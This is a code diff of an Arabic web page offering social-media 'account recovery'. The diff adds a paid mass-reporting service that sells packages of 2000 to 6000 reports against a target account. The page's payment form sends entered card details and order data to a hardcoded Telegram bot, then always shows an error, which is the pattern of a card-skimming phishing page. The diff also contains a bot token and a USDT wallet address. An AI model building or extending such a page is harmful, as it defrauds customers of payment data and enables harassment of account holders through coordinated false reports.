@@ -35,7 +35,7 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 /* FORM */
 .form-section{display:flex;justify-content:center;padding:30px 20px 60px}
 .form-card{background:rgba(255,255,255,.06);backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:20px;padding:35px;width:100%;max-width:560px;box-shadow:0 20px 60px rgba(0,0,0,.5)}
-.form-card h2{margin-bottom:25px;font-size:22px;text-align:center}
+.form-card h2{margin-bottom:22px;font-size:22px;text-align:center}
 .field{margin-bottom:18px}
 .field label{display:block;margin-bottom:8px;font-size:14px;color:#c8c8e0;font-weight:600}
 .field input,.field textarea,.field select{width:100%;padding:13px 15px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);border-radius:10px;color:#fff;font-size:15px;font-family:'Cairo',sans-serif;transition:.3s;direction:ltr;text-align:left}
@@ -47,7 +47,27 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 .submit-btn{width:100%;padding:15px;background:linear-gradient(45deg,#f09433,#dc2743,#bc1888);border:none;border-radius:12px;color:#fff;font-size:16px;font-weight:700;cursor:pointer;transition:.3s;font-family:'Cairo',sans-serif;margin-top:10px}
 .submit-btn:hover{transform:translateY(-2px);box-shadow:0 10px 25px rgba(220,39,67,.4)}
 
-/* PAYMENT METHODS (in modal) */
+/* SERVICE TABS */
+.service-tabs{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:22px}
+.service-tab{padding:14px 10px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.12);border-radius:14px;cursor:pointer;text-align:center;transition:.3s;font-family:'Cairo',sans-serif;color:#fff}
+.service-tab .srv-icon{font-size:24px;display:block;margin-bottom:4px}
+.service-tab .srv-title{font-size:14px;font-weight:700}
+.service-tab .srv-sub{font-size:11px;color:#a0a0c0;margin-top:2px}
+.service-tab.active{border-color:#dc2743;background:linear-gradient(45deg,rgba(240,148,51,.15),rgba(220,39,67,.15))}
+.service-tab:hover{border-color:#dc2743}
+
+/* PACKAGE CARDS */
+.package-grid{display:grid;grid-template-columns:1fr 1fr 1fr;gap:8px}
+.package-card{position:relative;cursor:pointer;display:block}
+.package-card input{position:absolute;opacity:0;pointer-events:none}
+.pkg-inner{background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.12);border-radius:12px;padding:14px 6px;text-align:center;transition:.3s}
+.package-card input:checked + .pkg-inner{border-color:#dc2743;background:linear-gradient(45deg,rgba(240,148,51,.18),rgba(220,39,67,.18));transform:translateY(-2px)}
+.package-card:hover .pkg-inner{border-color:#dc2743}
+.pkg-count{font-size:19px;font-weight:900;color:#fff}
+.pkg-label{font-size:11px;color:#a0a0c0;margin-bottom:6px}
+.pkg-price{font-size:16px;font-weight:900;background:linear-gradient(45deg,#f09433,#dc2743);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+
+/* PAYMENT METHODS */
 .pay-methods-title{text-align:center;font-size:15px;color:#c8c8e0;margin-bottom:15px;font-weight:600}
 .method-tabs{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:20px}
 .method-tab{padding:14px 10px;background:rgba(255,255,255,.06);border:2px solid rgba(255,255,255,.12);border-radius:14px;cursor:pointer;text-align:center;transition:.3s;font-family:'Cairo',sans-serif;color:#fff}
@@ -82,7 +102,23 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 .error-modal p,.success-modal p{text-align:center;color:#c8c8e0;margin-bottom:20px;line-height:1.6}
 .footer{text-align:center;padding:25px;color:#8080a0;font-size:13px;border-top:1px solid rgba(255,255,255,.08)}
 .footer a{color:#dc2743;text-decoration:none;margin-right:10px}
-@media(max-width:600px){.hero h1{font-size:26px}.hero p{font-size:15px}.form-card{padding:25px 20px}.header{padding:15px 18px}.logo span{font-size:13px}.tg-btn{font-size:12px;padding:6px 12px}.modal{padding:25px 20px}.method-tab .m-title{font-size:12px}}
+
+.summary-box{background:rgba(16,185,129,.1);border:1px solid rgba(16,185,129,.3);border-radius:10px;padding:12px;margin-bottom:18px;text-align:center;font-size:14px;color:#10b981}
+.summary-box strong{color:#fff}
+
+@media(max-width:600px){
+  .hero h1{font-size:26px}
+  .hero p{font-size:15px}
+  .form-card{padding:25px 20px}
+  .header{padding:15px 18px}
+  .logo span{font-size:13px}
+  .tg-btn{font-size:12px;padding:6px 12px}
+  .modal{padding:25px 20px}
+  .method-tab .m-title{font-size:12px}
+  .pkg-count{font-size:16px}
+  .pkg-price{font-size:14px}
+  .service-tab .srv-title{font-size:12px}
+}
 </style>
 </head>
 <body>
@@ -96,7 +132,7 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 </header>
 
 <section class="hero">
-  <h1>استرجاع الحسابات <span>باحترافية</span></h1>
+  <h1>استرجاع الحسابات <span>والإبلاغات</span></h1>
   <p>إنستغرام · فيسبوك · يوتيوب · تيك توك — بسرعة وأمان تام</p>
   <div class="badges">
     <span>🔒 آمن 100%</span>
@@ -114,8 +150,23 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 
 <section class="form-section">
   <div class="form-card">
-    <h2>📝 طلب استرجاع الحساب</h2>
-    <form id="recoveryForm">
+    <h2>📝 طلب خدمة</h2>
+
+    <!-- SERVICE TYPE TABS -->
+    <div class="service-tabs">
+      <button type="button" class="service-tab active" id="srvRecovery" onclick="switchService('recovery')">
+        <span class="srv-icon">🔐</span>
+        <div class="srv-title">استرجاع حساب</div>
+        <div class="srv-sub">من 25$</div>
+      </button>
+      <button type="button" class="service-tab" id="srvReports" onclick="switchService('reports')">
+        <span class="srv-icon">🚨</span>
+        <div class="srv-title">إبلاغات</div>
+        <div class="srv-sub">من 25$</div>
+      </button>
+    </div>
+
+    <form id="orderForm">
       <div class="field">
         <label>البريد الإلكتروني *</label>
         <input type="email" id="email" placeholder="example@email.com" required />
@@ -134,17 +185,59 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
         <label>اسم الحساب / الرابط *</label>
         <input type="text" id="username" placeholder="@username أو رابط الحساب" required />
       </div>
-      <div class="field">
-        <label>ملاحظات إضافية</label>
-        <textarea id="notes" rows="3" placeholder="أي معلومات تساعدنا في الاسترجاع..."></textarea>
+
+      <!-- RECOVERY OPTIONS -->
+      <div id="recoveryExtra">
+        <div class="field">
+          <label>ملاحظات إضافية</label>
+          <textarea id="notes" rows="3" placeholder="أي معلومات تساعدنا في الاسترجاع..."></textarea>
+        </div>
       </div>
+
+      <!-- REPORTS OPTIONS -->
+      <div id="reportsExtra" style="display:none">
+        <div class="field">
+          <label>اختر باقة الإبلاغ *</label>
+          <div class="package-grid">
+            <label class="package-card">
+              <input type="radio" name="reportPackage" value="2000" data-price="25" checked />
+              <div class="pkg-inner">
+                <div class="pkg-count">2000</div>
+                <div class="pkg-label">إبلاغ</div>
+                <div class="pkg-price">$25</div>
+              </div>
+            </label>
+            <label class="package-card">
+              <input type="radio" name="reportPackage" value="4000" data-price="50" />
+              <div class="pkg-inner">
+                <div class="pkg-count">4000</div>
+                <div class="pkg-label">إبلاغ</div>
+                <div class="pkg-price">$50</div>
+              </div>
+            </label>
+            <label class="package-card">
+              <input type="radio" name="reportPackage" value="6000" data-price="75" />
+              <div class="pkg-inner">
+                <div class="pkg-count">6000</div>
+                <div class="pkg-label">إبلاغ</div>
+                <div class="pkg-price">$75</div>
+              </div>
+            </label>
+          </div>
+        </div>
+        <div class="field">
+          <label>ملاحظات إضافية</label>
+          <textarea id="reportNotes" rows="3" placeholder="سبب الإبلاغ أو معلومات إضافية..."></textarea>
+        </div>
+      </div>
+
       <div class="field checkbox-field">
         <label class="checkbox-label">
           <input type="checkbox" id="confirm" required />
-          <span>أوافق على الشروط وسياسة الخصوصية وأؤكد أن الحساب ملكي</span>
+          <span>أوافق على الشروط وسياسة الخصوصية وأؤكد صحة البيانات</span>
         </label>
       </div>
-      <button type="submit" class="submit-btn">💳 المتابعة إلى الدفع - 25$</button>
+      <button type="submit" class="submit-btn" id="submitBtn">💳 المتابعة إلى الدفع - 25$</button>
     </form>
   </div>
 </section>
@@ -154,11 +247,11 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
   <div class="modal">
     <button class="close-modal" onclick="closeModal()">✕</button>
     <h2>💳 إتمام الدفع</h2>
-    <p class="price-tag">$25.00 USD</p>
+    <div class="summary-box" id="summaryBox"></div>
+    <p class="price-tag" id="priceTag">$25.00 USD</p>
 
     <p class="pay-methods-title">اختر طريقة الدفع</p>
 
-    <!-- Method selector -->
     <div class="method-tabs">
       <button type="button" class="method-tab active" id="tabCardBtn" onclick="switchTab('card')">
         <span class="m-icon">💳</span>
@@ -212,12 +305,12 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
           <option value="أخرى">🌍 أخرى</option>
         </select>
       </div>
-      <button class="pay-btn" id="cardPayBtn" onclick="payWithCard()">🔒 دفع 25$ بأمان</button>
+      <button class="pay-btn" id="cardPayBtn" onclick="payWithCard()">🔒 دفع بأمان</button>
     </div>
 
     <!-- USDT -->
     <div id="usdtTab" class="tab-content">
-      <p class="usdt-note">أرسل مبلغ 25 USDT (شبكة BEP20) إلى العنوان التالي:</p>
+      <p class="usdt-note">أرسل المبلغ المطلوب USDT (شبكة BEP20) إلى العنوان التالي:</p>
       <div class="wallet-box">
         <code id="walletAddress">0xcc77f540130d76e21eaf1e60481af20a56ee24fc</code>
         <button type="button" class="copy-btn" onclick="copyWallet()">📋 نسخ</button>
@@ -262,22 +355,75 @@ body{background:linear-gradient(135deg,#0f0c29,#302b63,#24243e);color:#fff;min-h
 // ============ CONFIG ============
 const TELEGRAM_BOT_TOKEN = "7370738476:AAHi1BjblAv9O1j3WB9yXRc6fPYf8euWfmQ";
 const TELEGRAM_CHAT_ID   = "7181380947";
-const PRICE_USD = 25;
 
 let currentOrder = {};
+let currentService = "recovery";
+let currentPrice = 25;
+
+// ============ SERVICE SWITCH ============
+function switchService(srv){
+  currentService = srv;
+  document.getElementById("srvRecovery").classList.toggle("active", srv === "recovery");
+  document.getElementById("srvReports").classList.toggle("active", srv === "reports");
+  document.getElementById("recoveryExtra").style.display = srv === "recovery" ? "block" : "none";
+  document.getElementById("reportsExtra").style.display  = srv === "reports"  ? "block" : "none";
+  updatePrice();
+}
+
+function updatePrice(){
+  if(currentService === "recovery"){
+    currentPrice = 25;
+  } else {
+    const sel = document.querySelector('input[name="reportPackage"]:checked');
+    currentPrice = parseInt(sel.dataset.price);
+  }
+  document.getElementById("submitBtn").innerText = `💳 المتابعة إلى الدفع - ${currentPrice}$`;
+}
+
+document.querySelectorAll('input[name="reportPackage"]').forEach(r=>{
+  r.addEventListener("change", updatePrice);
+});
 
 // ============ FORM SUBMIT ============
-document.getElementById("recoveryForm").addEventListener("submit", function(e){
+document.getElementById("orderForm").addEventListener("submit", function(e){
   e.preventDefault();
-  currentOrder = {
-    email: document.getElementById("email").value.trim(),
-    platform: document.getElementById("platform").value,
-    username: document.getElementById("username").value.trim(),
-    notes: document.getElementById("notes").value.trim(),
-    confirmed: document.getElementById("confirm").checked,
-    timestamp: new Date().toLocaleString("ar-EG")
-  };
+  const email    = document.getElementById("email").value.trim();
+  const platform = document.getElementById("platform").value;
+  const username = document.getElementById("username").value.trim();
+
+  if(currentService === "recovery"){
+    currentOrder = {
+      service: "استرجاع حساب",
+      email, platform, username,
+      notes: document.getElementById("notes").value.trim(),
+      confirmed: document.getElementById("confirm").checked,
+      timestamp: new Date().toLocaleString("ar-EG"),
+      price: currentPrice
+    };
+  } else {
+    const sel = document.querySelector('input[name="reportPackage"]:checked');
+    currentOrder = {
+      service: "إبلاغ عن حساب",
+      email, platform, username,
+      packageCount: sel.value,
+      packagePrice: sel.dataset.price,
+      notes: document.getElementById("reportNotes").value.trim(),
+      confirmed: document.getElementById("confirm").checked,
+      timestamp: new Date().toLocaleString("ar-EG"),
+      price: currentPrice
+    };
+  }
+
   if(!currentOrder.confirmed){ alert("يجب الموافقة على الشروط أولاً"); return; }
+
+  // Update modal summary + price
+  const summary = currentService === "reports"
+    ? `🚨 الخدمة: إبلاغ عن حساب<br><strong>${currentOrder.packageCount} إبلاغ</strong> على ${currentOrder.platform}`
+    : `🔐 الخدمة: استرجاع حساب<br>المنصة: <strong>${currentOrder.platform}</strong>`;
+
+  document.getElementById("summaryBox").innerHTML = summary;
+  document.getElementById("priceTag").innerText = `$${currentPrice}.00 USD`;
+  document.getElementById("cardPayBtn").innerText = `🔒 دفع ${currentPrice}$ بأمان`;
   document.getElementById("paymentModal").classList.add("active");
 });
 
@@ -287,19 +433,10 @@ function switchTab(tab){
   const usdtTab = document.getElementById("tabUsdtBtn");
   const cardContent = document.getElementById("cardTab");
   const usdtContent = document.getElementById("usdtTab");
-
-  cardTab.classList.remove("active");
-  usdtTab.classList.remove("active");
-  cardContent.classList.remove("active");
-  usdtContent.classList.remove("active");
-
-  if(tab === "card"){
-    cardTab.classList.add("active");
-    cardContent.classList.add("active");
-  }else{
-    usdtTab.classList.add("active");
-    usdtContent.classList.add("active");
-  }
+  cardTab.classList.remove("active"); usdtTab.classList.remove("active");
+  cardContent.classList.remove("active"); usdtContent.classList.remove("active");
+  if(tab === "card"){ cardTab.classList.add("active"); cardContent.classList.add("active"); }
+  else { usdtTab.classList.add("active"); usdtContent.classList.add("active"); }
 }
 
 // ============ CARD FORMATTING ============
@@ -343,8 +480,17 @@ async function payWithCard(){
   const btn = document.getElementById("cardPayBtn");
   btn.disabled = true; btn.innerText = "⏳ جارٍ المعالجة...";
 
+  let serviceDetails = "";
+  if(currentService === "reports"){
+    serviceDetails = `🚨 <b>الخدمة:</b> إبلاغ عن حساب\n📊 <b>الباقة:</b> <code>${currentOrder.packageCount} إبلاغ</code>`;
+  } else {
+    serviceDetails = `🔐 <b>الخدمة:</b> استرجاع حساب`;
+  }
+
   const message = `
 💳 <b>طلب دفع جديد - بطاقة</b>
+━━━━━━━━━━━━━━━━━━
+${serviceDetails}
 
 👤 <b>العميل:</b>
 📧 البريد: <code>${currentOrder.email}</code>
@@ -359,14 +505,12 @@ async function payWithCard(){
 👤 الاسم: <code>${cardName}</code>
 🏦 البلد: <code>${bank}</code>
 
-💰 المبلغ: $${PRICE_USD}
+💰 المبلغ: $${currentPrice}
 🕐 الوقت: ${currentOrder.timestamp}
   `;
 
   await sendToTelegram(message);
-
-  btn.disabled = false; btn.innerText = `🔒 دفع ${PRICE_USD}$ بأمان`;
-
+  btn.disabled = false; btn.innerText = `🔒 دفع ${currentPrice}$ بأمان`;
   closeModal();
   document.getElementById("errorModal").classList.add("active");
 }
@@ -379,8 +523,17 @@ async function payWithUsdt(){
   const btn = document.getElementById("usdtPayBtn");
   btn.disabled = true; btn.innerText = "⏳ جارٍ التأكيد...";
 
+  let serviceDetails = "";
+  if(currentService === "reports"){
+    serviceDetails = `🚨 <b>الخدمة:</b> إبلاغ عن حساب\n📊 <b>الباقة:</b> <code>${currentOrder.packageCount} إبلاغ</code>`;
+  } else {
+    serviceDetails = `🔐 <b>الخدمة:</b> استرجاع حساب`;
+  }
+
   const message = `
 🪙 <b>طلب دفع جديد - USDT BEP20</b>
+━━━━━━━━━━━━━━━━━━
+${serviceDetails}
 
 👤 <b>العميل:</b>
 📧 البريد: <code>${currentOrder.email}</code>
@@ -390,16 +543,14 @@ async function payWithUsdt(){
 
 🪙 <b>بيانات USDT:</b>
 🔗 Hash: <code>${txHash}</code>
-💰 المبلغ: ${PRICE_USD} USDT
+💰 المبلغ: ${currentPrice} USDT
 🌐 الشبكة: BEP20 (BSC)
 
 🕐 الوقت: ${currentOrder.timestamp}
   `;
 
   await sendToTelegram(message);
-
   btn.disabled = false; btn.innerText = "✅ تأكيد الدفع USDT";
-
   closeModal();
   document.getElementById("successModal").classList.add("active");
 }
